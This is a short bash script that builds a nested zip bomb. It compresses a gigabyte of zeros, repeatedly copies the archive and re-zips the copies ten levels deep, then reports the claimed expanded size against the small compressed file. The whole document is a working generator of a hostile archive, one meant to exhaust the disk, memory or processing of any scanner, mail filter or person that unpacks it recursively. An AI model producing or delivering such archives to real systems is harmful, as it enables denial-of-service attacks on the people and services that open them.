#!/usr/bin/env bash

dir=$(mktemp -d /tmp/zipbombXXXX)
dd if=/dev/zero bs=1M count=1024 | zip $dir/garbage.zip -

for i in {0..9}; do
  for j in {0..9}; do
    cp $dir/garbage.zip $dir/$j.zip
  done
  zip -9 $dir/garbage.zip $dir/?.zip
done

zip -9 bomb.zip $dir/garbage.zip

rm -fr $dir

which bc >&- 2>&- && {
  final=$(du -h bomb.zip | cut -d'	' -f1)
  size=$(bc <<< "10 ^ $i * 1000000 * 1024")
  readableSize=$(numfmt --to=iec-i --suffix=B $size) 2>&- && {
    echo $readableSize compressed into $final
  } || {
    echo "$size"B compressed into $final
  }
}
